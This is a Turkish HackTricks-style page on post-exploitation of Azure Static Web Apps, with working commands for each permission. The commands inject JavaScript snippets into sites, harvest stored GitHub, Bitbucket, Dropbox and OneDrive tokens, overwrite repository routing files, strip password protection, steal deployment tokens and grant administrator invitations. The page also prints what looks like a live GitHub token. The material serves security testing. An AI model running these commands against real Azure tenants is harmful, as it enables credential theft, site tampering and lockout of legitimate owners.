# Az - Statik Web Uygulamaları Sonrası İstismar

{{#include ../../../banners/hacktricks-training.md}}

## Azure Statik Web Uygulamaları

Bu hizmet hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../az-services/az-static-web-apps.md
{{#endref}}

### Microsoft.Web/staticSites/snippets/write

Bir snippet oluşturarak statik bir web sayfasının rastgele HTML kodu yüklemesi mümkündür. Bu, bir saldırganın web uygulaması içine JS kodu enjekte etmesine ve kimlik bilgileri veya mnemonic anahtarlar gibi hassas bilgileri çalmasına olanak tanıyabilir (web3 cüzdanlarında).

Aşağıdaki komut, web uygulaması tarafından her zaman yüklenecek bir snippet oluşturur::
```bash
az rest \
--method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/snippets/<snippet-name>?api-version=2022-03-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"name": "supersnippet",
"location": "Body",
"applicableEnvironmentsMode": "AllEnvironments",
"content": "PHNjcmlwdD4KYWxlcnQoIkF6dXJlIFNuaXBwZXQiKQo8L3NjcmlwdD4K",
"environments": [],
"insertBottom": false
}
}'
```
### Yapılandırılmış Üçüncü Taraf Kimlik Bilgilerini Okuma

App Service bölümünde açıklandığı gibi:

{{#ref}}
../az-privilege-escalation/az-app-services-privesc.md
{{#endref}}

Aşağıdaki komutu çalıştırarak, mevcut hesapta yapılandırılmış **üçüncü taraf kimlik bilgilerini** okumak mümkündür. Örneğin, bazı Github kimlik bilgileri farklı bir kullanıcıda yapılandırılmışsa, farklı bir kullanıcıdan token'a erişim sağlayamayacağınızı unutmayın.
```bash
az rest --method GET \
--url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
```
Bu komut, Github, Bitbucket, Dropbox ve OneDrive için token'lar döndürür.

İşte token'ları kontrol etmek için bazı komut örnekleri:
```bash
# GitHub – List Repositories
curl -H "Authorization: token <token>" \
-H "Accept: application/vnd.github.v3+json" \
https://api.github.com/user/repos

# Bitbucket – List Repositories
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://api.bitbucket.org/2.0/repositories

# Dropbox – List Files in Root Folder
curl -X POST https://api.dropboxapi.com/2/files/list_folder \
-H "Authorization: Bearer <token>" \
-H "Content-Type: application/json" \
--data '{"path": ""}'

# OneDrive – List Files in Root Folder
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://graph.microsoft.com/v1.0/me/drive/root/children
```
### Dosyayı Üzerine Yaz - Yolları, HTML, JS...

Azure üzerinden **Github token** kullanarak uygulamanın bulunduğu Github reposundaki bir dosyayı **üzerine yazmak** mümkündür. Aşağıdaki gibi bir istek göndererek, üzerine yazılacak dosyanın yolunu, dosyanın içeriğini ve commit mesajını belirtebilirsiniz.

Bu, saldırganlar tarafından esasen **web uygulamasının içeriğini değiştirmek** (kimlik bilgilerini çalmak, mnemonic anahtarlar...) veya sadece belirli yolları kendi sunucularına **yönlendirmek** için `staticwebapp.config.json` dosyasını üzerine yazarak kötüye kullanılabilir.

> [!WARNING]
> Bir saldırganın Github reposunu herhangi bir şekilde ele geçirmesi durumunda, dosyayı doğrudan Github üzerinden de üzerine yazabileceğini unutmayın.
```bash
curl -X PUT "https://functions.azure.com/api/github/updateGitHubContent" \
-H "Content-Type: application/json" \
-d '{
"commit": {
"message": "Update static web app route configuration",
"branchName": "main",
"committer": {
"name": "Azure App Service",
"email": "donotreply@microsoft.com"
},
"contentBase64Encoded": "ewogICJuYXZpZ2F0aW9uRmFsbGJhY2siOiB7CiAgICAicmV3cml0ZSI6ICIvaW5kZXguaHRtbCIKICB9LAogICJyb3V0ZXMiOiBbCiAgICB7CiAgICAgICJyb3V0ZSI6ICIvcHJvZmlsZSIsCiAgICAgICJtZXRob2RzIjogWwogICAgICAgICJnZXQiLAogICAgICAgICJoZWFkIiwKICAgICAgICAicG9zdCIKICAgICAgXSwKICAgICAgInJld3JpdGUiOiAiL3AxIiwKICAgICAgInJlZGlyZWN0IjogIi9sYWxhbGEyIiwKICAgICAgInN0YXR1c0NvZGUiOiAzMDEsCiAgICAgICJhbGxvd2VkUm9sZXMiOiBbCiAgICAgICAgImFub255bW91cyIKICAgICAgXQogICAgfQogIF0KfQ==",
"filePath": "staticwebapp.config.json",
"message": "Update static web app route configuration",
"repoName": "carlospolop/my-first-static-web-app",
"sha": "4b6165d0ad993a5c705e8e9bb23b778dff2f9ca4"
},
"gitHubToken": "gho_1OSsm834ai863yKkdwHGj31927PCFk44BAXL"
}'
```
### Microsoft.Web/staticSites/config/write

Bu izinle, bir statik web uygulamasını koruyan **şifreyi değiştirmek** veya aşağıdaki gibi bir istek göndererek her ortamı korumasız hale getirmek mümkündür:
```bash
# Change password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"password": "SuperPassword123.",
"secretUrl": "",
"applicableEnvironmentsMode": "AllEnvironments"
}
}'



# Remove the need of a password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"secretUrl": "",
"applicableEnvironmentsMode": "SpecifiedEnvironments",
"secretState": "None"
}
}'
```
### Microsoft.Web/staticSites/listSecrets/action

Bu izin, statik uygulama için **API anahtarı dağıtım jetonunu** almayı sağlar:
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/listSecrets?api-version=2023-01-01"
```
Sonra, **token kullanarak bir uygulamayı güncellemek için** aşağıdaki komutu çalıştırabilirsiniz. Bu komut, **Github Action'ın [https://github.com/Azure/static-web-apps-deploy](https://github.com/Azure/static-web-apps-deploy) nasıl çalıştığını kontrol ederek** çıkarılmıştır, çünkü bu Azure tarafından varsayılan olarak kullanılmak üzere ayarlanmıştır. Bu nedenle, görüntü ve ayarlar gelecekte değişebilir.

> [!TIP]
> Uygulamayı dağıtmak için [https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token](https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token) adresindeki **`swa`** aracını kullanabilir veya aşağıdaki adımları izleyebilirsiniz:

1. [https://github.com/staticwebdev/react-basic](https://github.com/staticwebdev/react-basic) (veya dağıtmak istediğiniz başka bir repo) reposunu indirin ve `cd react-basic` komutunu çalıştırın.
2. Dağıtmak istediğiniz kodu değiştirin.
3. Aşağıdaki komutu çalıştırarak dağıtın ( `<api-token>` kısmını değiştirmeyi unutmayın):
```bash
docker run --rm -v $(pwd):/mnt mcr.microsoft.com/appsvc/staticappsclient:stable INPUT_AZURE_STATIC_WEB_APPS_API_TOKEN=<api-token> INPUT_APP_LOCATION="/mnt" INPUT_API_LOCATION="" INPUT_OUTPUT_LOCATION="build" /bin/staticsites/StaticSitesClient upload --verbose
```
> [!WARNING]
> Tokenunuz olsa bile, **Deployment Authorization Policy** **Github** olarak ayarlandığında uygulamayı dağıtamayacaksınız. Token'ı kullanmak için dağıtım yöntemini APi token'ını kullanacak şekilde değiştirmek için `Microsoft.Web/staticSites/write` iznine ihtiyacınız olacak.

### Microsoft.Web/staticSites/write

Bu izinle, **statik web uygulamasının kaynağını farklı bir Github deposuna değiştirmek** mümkündür, ancak bu otomatik olarak sağlanmayacaktır çünkü bu bir Github Action üzerinden yapılmalıdır.

Ancak, **Deployment Authorization Policy** **Github** olarak ayarlandığında, **yeni kaynak deposundan uygulamayı güncellemek mümkündür!**.

Eğer **Deployment Authorization Policy** Github olarak ayarlanmamışsa, aynı `Microsoft.Web/staticSites/write` izni ile bunu değiştirebilirsiniz.
```bash
# Change the source to a different Github repository
az staticwebapp update --name my-first-static-web-app --resource-group Resource_Group_1 --source https://github.com/carlospolop/my-first-static-web-app -b main

# Update the deployment method to Github
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>?api-version=2022-09-01" \
--headers 'Content-Type=application/json' \
--body '{
"properties": {
"allowConfigFileUpdates": true,
"stagingEnvironmentPolicy": "Enabled",
"buildProperties": {
"appLocation": "/",
"apiLocation": "",
"appArtifactLocation": "build"
},
"deploymentAuthPolicy": "GitHub",
"repositoryToken": "<github_token>" # az rest --method GET --url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
}
}'
```
Uygulamayı dağıtmak için örnek Github Action:
```yaml
name: Azure Static Web Apps CI/CD

on:
push:
branches:
- main
pull_request:
types: [opened, synchronize, reopened, closed]
branches:
- main

jobs:
build_and_deploy_job:
if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')
runs-on: ubuntu-latest
name: Build and Deploy Job
permissions:
id-token: write
contents: read
steps:
- uses: actions/checkout@v3
with:
submodules: true
lfs: false
- name: Install OIDC Client from Core Package
run: npm install @actions/core@1.6.0 @actions/http-client
- name: Get Id Token
uses: actions/github-script@v6
id: idtoken
with:
script: |
const coredemo = require('@actions/core')
return await coredemo.getIDToken()
result-encoding: string
- name: Build And Deploy
id: builddeploy
uses: Azure/static-web-apps-deploy@v1
with:
azure_static_web_apps_api_token: "12345cbb198a77a092ff885782a62a15d5aef5e3654cac1234509ab54547270704-4140ccee-e04f-424f-b4ca-3d4dd123459c00f0702071d12345" # A valid formatted token is needed although it won't be used for authentication
action: "upload"
###### Repository/Build Configurations - These values can be configured to match your app requirements. ######
# For more information regarding Static Web App workflow configurations, please visit: https://aka.ms/swaworkflowconfig
app_location: "/" # App source code path
api_location: "" # Api source code path - optional
output_location: "build" # Built app content directory - optional
github_id_token: ${{ steps.idtoken.outputs.result }}
###### End of Repository/Build Configurations ######

close_pull_request_job:
if: github.event_name == 'pull_request' && github.event.action == 'closed'
runs-on: ubuntu-latest
name: Close Pull Request Job
steps:
- name: Close Pull Request
id: closepullrequest
uses: Azure/static-web-apps-deploy@v1
with:
action: "close"
```
### Microsoft.Web/staticSites/resetapikey/action

Bu izinle, **statik web uygulamasının API anahtarını sıfırlamak** mümkün olup, uygulamayı otomatik olarak dağıtan iş akışlarını potansiyel olarak DoS saldırısına uğratabilir.
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/resetapikey?api-version=2019-08-01"
```
### Microsoft.Web/staticSites/createUserInvitation/action

Bu izin, belirli bir rol ile bir statik web uygulamasının korumalı yollarına erişim için **bir kullanıcıya davetiye oluşturmayı** sağlar.

Giriş, `/.auth/login/github` gibi bir yolda veya Entra ID için `/.auth/login/aad` yolunda bulunur ve bir kullanıcı aşağıdaki komut ile davet edilebilir:
```bash
az staticwebapp users invite \
--authentication-provider Github # AAD, Facebook, GitHub, Google, Twitter \
--domain mango-beach-071d9340f.4.azurestaticapps.net # Domain of the app \
--invitation-expiration-in-hours 168 # 7 days is max \
--name my-first-static-web-app # Name of the app\
--roles "contributor,administrator" # Comma sepparated list of roles\
--user-details username # Github username in this case\
--resource-group Resource_Group_1 # Resource group of the app
```
### Pull Requests

Varsayılan olarak, aynı repo içindeki bir dalda yapılan Pull Requests otomatik olarak derlenir ve bir staging ortamında oluşturulur. Bu, repo üzerinde yazma erişimi olan ancak üretim dalının korumalarını (genellikle `main`) aşamayan bir saldırgan tarafından kötüye kullanılabilir ve **uygulamanın kötü niyetli bir versiyonunu** staging URL'sinde dağıtabilir.

Staging URL'si bu formatta: `https://<app-subdomain>-<PR-num>.<region>.<res-of-app-domain>` örneğin: `https://ambitious-plant-0f764e00f-2.eastus2.4.azurestaticapps.net`

> [!TIP]
> Varsayılan olarak, harici PR'ler en az 1 PR'yi depoya birleştirmedikçe iş akışlarını çalıştırmaz. Bir saldırgan, depoya geçerli bir PR gönderebilir ve **sonra kötü niyetli bir PR** göndererek kötü niyetli uygulamayı staging ortamında dağıtabilir. ANCAK, beklenmedik bir koruma vardır; statik web uygulamasına dağıtım yapmak için varsayılan Github Action, dağıtım token'ını içeren sırra erişim gerektirir (örneğin `secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_AMBITIOUS_PLANT_0F764E00F`) dağıtım IDToken ile yapılsa bile. Bu, harici bir PR'nin bu sırra erişimi olmayacağı ve harici bir PR'nin iş akışını burada keyfi bir token yerleştirecek şekilde değiştiremeyeceği anlamına gelir; bu nedenle **bu saldırı gerçekten işe yaramayacaktır**.

{{#include ../../../banners/hacktricks-training.md}}
